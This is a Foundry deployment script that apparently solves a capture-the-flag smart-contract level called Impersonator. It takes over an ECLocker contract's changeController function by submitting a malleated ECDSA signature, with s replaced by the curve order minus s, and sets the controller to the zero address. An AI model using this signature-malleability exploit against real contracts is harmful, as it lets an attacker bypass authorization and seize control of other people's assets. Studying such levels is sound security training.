// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Impersonator.sol";

contract ImpersonatorScript is Script {
    Impersonator target;
    ECLocker ec;
    function setUp() public {
        target = Impersonator(0x7a46b4731043ffC423858F93b5DDeb41002b62e1);
        ec = ECLocker(target.lockers(0));
    }

    function run() public {
        vm.startBroadcast();

        uint8 v = 28;
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        bytes32 n =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

        ec.changeController(v, r, bytes32(uint256(n)-uint256(s)), address(0));

        vm.stopBroadcast();
    }
}

